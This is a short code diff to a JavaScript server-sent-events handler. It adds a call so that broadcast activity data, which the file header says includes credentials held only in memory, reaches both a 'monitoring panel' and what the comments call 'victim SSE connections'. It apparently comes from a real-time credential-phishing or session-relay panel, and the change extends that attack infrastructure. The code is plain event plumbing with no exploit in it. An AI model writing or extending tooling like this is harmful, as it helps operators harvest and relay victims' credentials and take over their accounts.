@@ -2,7 +2,7 @@
 // Accepts activity data and broadcasts to all connected SSE clients
 // Credentials exist only in memory during broadcast - never stored
 
-import { publishActivity } from './kv-client';
+import { publishActivity, triggerMemorySubscribers } from './kv-client';
 
 // In-memory store for active SSE connections
 const sseConnections = new Set();
@@ -19,6 +19,7 @@ export function addSSEConnection(res) {
 export function broadcastToSSE(data) {
   const message = `data: ${JSON.stringify(data)}\n\n`;
   
+  // Broadcast to monitoring panel SSE connections
   sseConnections.forEach(res => {
     try {
       res.write(message);
@@ -27,6 +28,9 @@ export function broadcastToSSE(data) {
       sseConnections.delete(res);
     }
   });
+  
+  // CRITICAL: Also trigger memory event subscribers (for victim SSE connections)
+  triggerMemorySubscribers(data);
 }
 
 export default async function handler(req, res) {
